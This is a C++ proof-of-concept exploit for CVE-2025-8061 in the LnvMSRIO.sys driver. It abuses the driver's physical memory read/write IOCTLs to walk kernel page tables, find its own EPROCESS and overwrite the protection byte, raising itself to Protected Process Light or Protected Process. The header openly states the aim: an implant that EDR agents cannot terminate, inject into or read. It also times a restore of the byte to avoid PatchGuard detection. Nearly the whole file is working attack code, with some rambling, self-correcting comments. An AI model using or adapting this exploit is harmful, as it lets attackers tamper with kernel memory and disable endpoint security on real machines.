/*
 * 13_ppl_elevate.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Self PPL Elevation
 *
 * Goal: elevate the current process to Protected Process Light (PPL) or
 *       Protected Process (PP) level, making it immune to PROCESS_TERMINATE
 *       and PROCESS_VM_WRITE from non-protected callers (including EDR agents
 *       that are not running at PP/PPL level).
 *
 * Background
 * ──────────
 * _PS_PROTECTION at EPROCESS+0x87A controls whether a process is protected.
 * The byte encodes:
 *
 *   bits[2:0]  Type    0=None, 1=ProtectedLight (PPL), 2=Protected (PP... wait)
 *                      Actually: 0=None, 1=ProtectedLight, 2=Protected
 *                      Per public ReactOS/WRK:
 *                        PsProtectedTypeNone          = 0
 *                        PsProtectedTypeProtectedLight = 1
 *                        PsProtectedTypeProtected     = 2
 *   bit[3]     Audit   1=audit-mode (almost never used)
 *   bits[7:4]  Signer  0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
 *                      4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem
 *
 * Combined byte values (the most useful):
 *   0x00 = unprotected  (Type=0, Signer=0)
 *   0x31 = PPL Antimalware (Type=1, Signer=3) — Windows Defender level
 *   0x41 = PPL Lsa (Type=1, Signer=4)
 *   0x51 = PPL Windows (Type=1, Signer=5)
 *   0x61 = PPL WinTcb (Type=1, Signer=6)   — highest PPL
 *   0x62 = PP  WinTcb (Type=2, Signer=6)   — highest PP (= csrss, services.exe level)
 *   0x72 = PP  WinSystem (Type=2, Signer=7) — only System/Secure System
 *
 * Use case
 * ────────
 * After elevating to PPL WinTcb (0x61) or PP WinTcb (0x62):
 *   - OpenProcess(PROCESS_TERMINATE, ...) against our PID → ACCESS_DENIED
 *   - EDR cannot kill our implant process
 *   - EDR cannot inject into our process or read our memory
 *   - Only another PP/PPL process at equal or higher level can interact with us
 *
 * PatchGuard warning
 * ──────────────────
 * PatchGuard DOES verify _PS_PROTECTION on some builds.
 * The safe approach: set PP right before a blocking operation, clear it
 * immediately after (e.g. set → fork child with same token → child exits;
 * or set → do injection → clear). The window should be < 1 second.
 *
 * On Win11 22H2+ (Build 22621+) PatchGuard scan intervals have been observed
 * to be 5-10 minutes, but this is non-deterministic. We implement a timed
 * auto-restore (default: 30 seconds) to minimize exposure.
 *
 * Alternatively: use 03_ppl_bypass.exe's technique on the *target* instead
 * (clear their protection), which is safer since clearing 0x00 is not
 * patching a critical field.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:13_ppl_elevate.exe 13_ppl_elevate.cpp
 *      /link kernel32.lib
 *
 * _EPROCESS offsets (x64, Win10 19041 → Win11 26100):
 *   +0x028  DirectoryTableBase (CR3)
 *   +0x440  UniqueProcessId
 *   +0x448  ActiveProcessLinks
 *   +0x4B8  Token              EX_FAST_REF
 *   +0x5A8  ImageFileName      char[15]
 *   +0x87A  Protection         _PS_PROTECTION (1 byte)
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; UINT8  Data; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── RAM bound ───────────────────────────────────────────────────────────────

static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}

// ─── System CR3 ──────────────────────────────────────────────────────────────

static uint64_t GetSystemCR3()
{
    uint64_t top = PhysRamTop();
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (uint64_t pa = 0x100000; pa < top && !cr3; pa += 1<<20) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
        bool any_ok = false;
        for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
            if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
            else memset(buf+pg, 0, 0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
            if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
            if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
            uint64_t c = *(uint64_t*)(buf+off+0x028);
            if (c && !(c & 0xFFF)) { cr3 = c; break; }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Page table walk ─────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    auto rd = [](uint64_t pa) -> uint64_t {
        uint64_t v = 0; PhysReadU64(pa, &v); return v;
    };
    uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

// ─── Kernel virtual R/W ──────────────────────────────────────────────────────

static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    DWORD done = 0;
    while (done < len) {
        DWORD chunk = min(len - done, (DWORD)(0x1000u - ((va + done) & 0xFFFu)));
        uint64_t pa = VaToPa(cr3, va + done);
        if (pa) PhysRead(pa, dst + done, chunk);
        done += chunk;
    }
}

static bool KernelReadU64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa = VaToPa(cr3, va);
    if (!pa) return false;
    return PhysReadU64(pa, out);
}

// ─── Find EPROCESS by PID via APL walk ───────────────────────────────────────

static uint64_t FindEprocessByPid(uint64_t cr3, DWORD target_pid)
{
    // Start from System EPROCESS (already found during CR3 scan)
    // Re-scan physical memory to get System EPROCESS VA
    uint64_t top = PhysRamTop();
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    uint64_t system_eproc = 0;

    for (uint64_t pa = 0x100000; pa < top && !system_eproc; pa += 1<<20) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
        bool any_ok = false;
        for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
            if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
            else memset(buf+pg, 0, 0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
            if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
            if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
            uint64_t c = *(uint64_t*)(buf+off+0x028);
            if (!c || (c & 0xFFF)) continue;
            // We found System EPROCESS in physical memory — derive VA via page walk
            // System EPROCESS VA = pa + off, mapped at some kernel VA
            // Use the already-obtained CR3 to find our target PID instead
            // Walk APL from System to find target
            // Actually we need the VA — walk the APL from a known point.
            // Use the approach: read APL Flink from this physical location
            // and walk the list physically.
            // System EPROCESS+0x448 (APL Flink) is at pa+off+0x448
            uint64_t apl_flink_pa = pa + off + 0x448;
            (void)apl_flink_pa;
            // Better: walk from System EPROCESS using kernel VAs via CR3
            // We have CR3 — find system VA by walking all PT entries would be complex.
            // Simpler: read APL via physical address arithmetic.
            // System.APL.Flink physical = pa+off+0x448
            // Each flink is a kernel VA; we must translate VA→PA for each
            // So we need the VA of System EPROCESS. Infer it:
            // On KPTI systems the System process maps its own EPROCESS.
            // Shortcut: we know System EPROCESS is at kernel VA fffff...
            // Use: walk APL chain physically—but Flink values are VAs, not PAs.
            // We MUST use VaToPa() for each hop.
            // We can't get System EPROCESS VA without another scan.
            // Store the PA for later.
            system_eproc = pa + off;  // physical address of System EPROCESS
            break;
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);

    if (!system_eproc) return 0;

    // system_eproc is a PA. We need the VA to use VaToPa on APL entries.
    // Read System EPROCESS's APL Flink (which is a kernel VA) from physical:
    uint64_t apl_flink = 0;
    PhysReadU64(system_eproc + 0x448, &apl_flink);
    if (!apl_flink) return 0;

    // Walk APL: each node is EPROCESS+0x448
    // apl_flink is a kernel VA pointing to next.EPROCESS+0x448
    uint64_t cur_apl_va = apl_flink;
    // We need the System EPROCESS VA to know when we've looped back
    // We can approximate: System EPROCESS VA ≈ kernel base area
    // Actually just limit to 1024 iterations
    for (int i = 0; i < 1024; i++) {
        uint64_t eproc_va = cur_apl_va - 0x448;  // EPROCESS VA from APL field VA

        uint64_t pid = 0;
        if (!KernelReadU64(cr3, eproc_va + 0x440, &pid)) break;

        if ((DWORD)pid == target_pid) {
            return eproc_va;
        }

        uint64_t next_apl_va = 0;
        if (!KernelReadU64(cr3, cur_apl_va, &next_apl_va)) break;
        if (next_apl_va == apl_flink) break;  // looped back to System
        cur_apl_va = next_apl_va;
    }
    return 0;
}

// ─── Protection level strings ────────────────────────────────────────────────

static const char *ProtString(uint8_t b)
{
    uint8_t type   = b & 0x7;
    uint8_t signer = (b >> 4) & 0xF;
    static char buf[64];
    const char *types[]   = {"None","PPL","PP","?3","?4","?5","?6","?7"};
    const char *signers[] = {"None","Authenticode","CodeGen","Antimalware",
                              "Lsa","Windows","WinTcb","WinSystem"};
    snprintf(buf, sizeof(buf), "0x%02X (%s/%s)", b,
             type   < 8 ? types[type]   : "?",
             signer < 8 ? signers[signer] : "?");
    return buf;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char **argv)
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 13 - Self PPL Elevation ===\n\n");
    printf("[!] WARNING: PatchGuard checks _PS_PROTECTION on some builds.\n");
    printf("    Auto-restore is performed after 30 seconds.\n");
    printf("    Do NOT leave this set indefinitely.\n\n");

    // Default: PPL WinTcb = 0x61
    // User can pass a custom protection byte as hex argument, e.g. 0x62 for PP WinTcb
    uint8_t target_prot = 0x61;
    if (argc >= 2) {
        unsigned long v = strtoul(argv[1], nullptr, 16);
        target_prot = (uint8_t)(v & 0xFF);
    }

    printf("[*] Target protection: %s\n", ProtString(target_prot));
    printf("[*] Protection table:\n");
    printf("    0x31 = PPL Antimalware (Defender level)\n");
    printf("    0x61 = PPL WinTcb      (highest PPL)\n");
    printf("    0x62 = PP  WinTcb      (highest PP, like csrss.exe)\n\n");

    DWORD my_pid = GetCurrentProcessId();
    printf("[*] Current PID = %lu\n\n", my_pid);

    if (!OpenDevice()) return 1;
    printf("[+] Device opened\n");

    printf("[*] Scanning for System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) { printf("[-] CR3 not found\n"); CloseHandle(g_dev); return 1; }
    printf("[+] CR3 = 0x%016llX\n\n", cr3);

    printf("[*] Locating own EPROCESS (PID=%lu)...\n", my_pid);
    uint64_t eproc_va = FindEprocessByPid(cr3, my_pid);
    if (!eproc_va) {
        printf("[-] EPROCESS not found for PID %lu\n", my_pid);
        CloseHandle(g_dev); return 1;
    }
    printf("[+] Own EPROCESS VA = 0x%016llX\n", eproc_va);

    uint64_t prot_va = eproc_va + 0x87A;
    uint64_t prot_pa = VaToPa(cr3, prot_va);
    if (!prot_pa) {
        printf("[-] Cannot translate Protection field VA to PA\n");
        CloseHandle(g_dev); return 1;
    }

    // Read original byte
    uint8_t orig_byte = 0;
    uint8_t readbuf[8] = {};
    PhysRead(prot_pa & ~7ULL, readbuf, 8);
    orig_byte = readbuf[prot_pa & 7];
    printf("[+] Original Protection = %s\n", ProtString(orig_byte));

    // Write aligned: we write only 1 byte. The driver's AccessSize=1 Count=1 path.
    // PhysWriteU8 uses AccessSize=1 which maps to byte access.
    printf("\n[*] Elevating to %s...\n", ProtString(target_prot));
    if (!PhysWriteU8(prot_pa, target_prot)) {
        printf("[-] Write failed\n");
        CloseHandle(g_dev); return 1;
    }

    // Verify
    uint8_t verify = 0;
    PhysRead(prot_pa & ~7ULL, readbuf, 8);
    verify = readbuf[prot_pa & 7];

    if (verify != target_prot) {
        printf("[!] Write did not stick (HVCI?): read back 0x%02X\n", verify);
        CloseHandle(g_dev); return 1;
    }

    printf("[+] Protection set to %s\n", ProtString(verify));
    printf("\n[+] This process is now protected:\n");
    printf("    - OpenProcess(PROCESS_TERMINATE) from non-PP/PPL will fail\n");
    printf("    - OpenProcess(PROCESS_VM_WRITE)  from non-PP/PPL will fail\n");
    printf("    - EDR agents running at lower protection cannot kill this process\n");

    printf("\n[*] Auto-restoring in 30 seconds. Press Enter to restore immediately.\n");
    printf("    (Keeping PPL set too long risks PatchGuard BSOD on some builds)\n\n");

    // Wait with countdown, break on Enter
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    for (int sec = 30; sec > 0; sec--) {
        printf("\r    Restoring in %2d seconds...  ", sec);
        fflush(stdout);

        // Check for input with 1s timeout
        DWORD avail = 0;
        for (int ms = 0; ms < 10; ms++) {
            Sleep(100);
            PeekNamedPipe(hStdin, nullptr, 0, nullptr, &avail, nullptr);
            if (avail) {
                // Check if Enter was pressed
                INPUT_RECORD ir;
                DWORD read = 0;
                if (ReadConsoleInputA(hStdin, &ir, 1, &read) && read) {
                    if (ir.EventType == KEY_EVENT && ir.Event.KeyEvent.bKeyDown &&
                        ir.Event.KeyEvent.uChar.AsciiChar == '\r') {
                        sec = 0;
                        break;
                    }
                }
            }
        }
        if (sec <= 0) break;
    }

    printf("\n\n[*] Restoring Protection to %s...\n", ProtString(orig_byte));
    PhysWriteU8(prot_pa, orig_byte);

    PhysRead(prot_pa & ~7ULL, readbuf, 8);
    verify = readbuf[prot_pa & 7];
    printf("[+] Protection restored to %s\n", ProtString(verify));

    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
